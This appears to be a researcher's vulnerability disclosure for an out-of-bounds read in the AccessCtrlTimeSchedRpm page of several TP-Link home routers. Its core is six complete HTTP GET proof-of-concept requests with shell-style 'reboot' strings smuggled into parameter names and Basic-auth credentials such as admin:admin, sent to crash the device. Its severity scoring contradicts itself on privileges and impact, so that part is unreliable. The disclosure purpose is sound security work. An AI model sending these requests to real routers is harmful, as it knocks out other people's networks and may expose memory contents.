# TP-Link TL-WR940N/TL-WR841N/TL-WR740N/TL-WR941ND wireless router /userRpm/AccessCtrlTimeSchedRpm buffer read out-of-bounds vulnerability

## 1 Basic Information

- Vulnerability Type: Buffer read out-of-bounds
- Vulnerability Description: A buffer read out-of-bounds vulnerability exists in TP-Link TL-WR940N V4、TP-Link TL-WR841N V8/V10、 TP-Link TL-WR740N V1/V2、TP-Link TL-WR940N V2/V3 and TP-Link TL-WR941ND V5/V6 wireless router. Its /userRpm/AccessCtrlTimeSchedRpm component has a security vulnerability in processing Changed GET key parameters, allowing remote attackers to submit special requests through the vulnerability, causing buffer out-of-bounds read errors, which may lead to memory-sensitive information leakage and denial of service.
- Device model:
  - TP-Link TL-WR940N V4、TP-Link TL-WR841N V8/V10、TP-Link TL-WR740N V1/V2、TP-Link TL-WR940N V2/V3、TP-Link TL-WR941ND V5/V6  

## 2 Vulnerability Value 

- Maturity of Public Information: None

- Order of Public Vulnerability Analysis Report: None

- Stable reproducibility: yes

- Vulnerability Score (refer to CVSS)

  - V2：[7.1 High AV:N/AC:H/Au:S/C:C/I:C/A:C](https://nvd.nist.gov/vuln-metrics/cvss/v2-calculator?vector=(AV:N/AC:H/Au:S/C:C/I:C/A:C))
  - V3.1：[8.6 High AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H&version=3.1)

- Exploit Conditions

  - Attack Vector Type: Network
  - Attack Complexity: Low
  - Complexity of Exploit
    - Permission Constraints: authentication is required
    - User Interaction: No victim interaction required
  - Scope of Impact: Changed (may affect other components than vulnerable ones)
  - Impact Indicators:
    - Confidentiality: High
    - Integrity: High
    - Availability: High
  - Stability of vulnerability exploitation: Stable recurrence
  - Whether the product default configuration: There are vulnerabilities in functional components that are enabled out of the factory

- Exploit Effect
  - Denial of Service

## 3 PoC

The PoC of TP-Link TL-WR940N is as follows:

```http
GET /ZYROEMCBUFENISDA/userRpm/AccessCtrlTimeSchedRpm.htm?time_sched_name=test&day_type=1&all_hours=on&||reboot=0&SelIndex=0&fromAdd=0&Page=1&Save=Save HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://127.0.0.1:8081/ZYROEMCBUFENISDA/userRpm/AccessCtrlTimeSchedRpm.htm?Add=Add&Page=1
Cookie: Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D
Upgrade-Insecure-Requests: 1

```

The PoC of TP-Link TL-WR841N V10 is as follows:

```http
GET /RODYEYNAKQNKXJXB/userRpm/AccessCtrlTimeSchedRpm.htm?time_sched_name=test&day_type=1&all_hours=on&Changed|CMD=$"reboot";$CMD=0&SelIndex=0&fromAdd=0&Page=1&Save=Save HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://127.0.0.1:8081/RODYEYNAKQNKXJXB/userRpm/AccessCtrlTimeSchedRpm.htm?Add=Add&Page=1
Cookie: Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D
Upgrade-Insecure-Requests: 1

```

The PoC of TP-Link TL-WR740N is as follows:

```http
GET /userRpm/AccessCtrlTimeSchedRpm.htm?time_sched_name=WE&day_type=1&all_hours=on&||reboot=0&SelIndex=0&Page=1&Save=Save HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Basic YWRtaW46YWRtaW4=
Connection: keep-alive
Referer: http://192.168.1.1/userRpm/AccessCtrlTimeSchedRpm.htm?Add=Add&Page=1
Upgrade-Insecure-Requests: 1

```

The PoC of TP-Link TL-WR940N V2/TL-WR941ND V5 is as follows:

```http
GET /MZKBGETBOHFWYCNC/userRpm/AccessCtrlTimeSchedRpm.htm?time_sched_name=1&day_type=1&all_hours=on&ChangedCMD=$"reboot";$CMD=0&SelIndex=0&fromAdd=0&Page=1&Save=Save HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://192.168.0.1/ZRCEHZIAURWJWDTC/userRpm/AccessCtrlTimeSchedRpm.htm?Add=Add&Page=1
Cookie: Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D
Upgrade-Insecure-Requests: 1

```

The PoC of TP-Link TL-WR940N V3/TL-WR941ND V6 is as follows:

```http
GET /IOCGBYQCJARLTZQC/userRpm/AccessCtrlTimeSchedRpm.htm?time_sched_name=1&day_type=1&all_hours=on&&CMD=$'reboot';$CMD=0&SelIndex=0&fromAdd=0&Page=1&Save=Save HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://192.168.0.1/WRKWVQRABLAJMDEB/userRpm/AccessCtrlTimeSchedRpm.htm?Add=Add&Page=1
Cookie: Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D
Upgrade-Insecure-Requests: 1

```

The PoC of TP-Link TL-WR841N V8 is as follows:

```http
GET /userRpm/AccessCtrlTimeSchedRpm.htm?time_sched_name=3raw4r&day_type=1&all_hours=on&||reboot=0&SelIndex=0&fromAdd=0&Page=1&Save=Save HTTP/1.1
Host: 0.0.0.0:49169
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Basic YWRtaW46YWRtaW4=
Connection: keep-alive
Referer: http://0.0.0.0:49169/userRpm/AccessCtrlTimeSchedRpm.htm?Add=Add&Page=1
Cookie: Authorization=
Upgrade-Insecure-Requests: 1

```

## 4 Vulnerability Principle

When the Web management component receives a GET request, its /userRpm/AccessCtrlTimeSchedRpm component has a security vulnerability in processing the Changed GET key parameter. The Changed parameter itself is put into the stack without being checked, resulting in a denial of service. An attacker exploits the Changed parameter of this vulnerability to cause a buffer out-of-bounds read error, which may lead to memory-sensitive information disclosure and denial of service. Attackers can directly achieve the effect of denial of service by exploiting this vulnerability.

The firmware simulation process and interface are as follows:

![](./imgs/fang.png)

![](./imgs/before.png)

![](./imgs/web.png)

![](./imgs/router2.png)

![](./imgs/router3.png)

![](./imgs/router4.png)

After sending the constructed PoC, the cache area read out of bounds and a BadVA error occurred, resulting in denial of service.

![](./imgs/read_err.png)

![](./imgs/after.png)

![](./imgs/err.png)

## 5. The basis for judging as a 0-day vulnerability

Searching the AccessCtrlTimeSchedRpm keyword in the NVD database did not find any vulnerabilities; searching the firmware model + parameter Changed keyword in the NVD database did not find any vulnerabilities, so it is considered a 0-day vulnerability.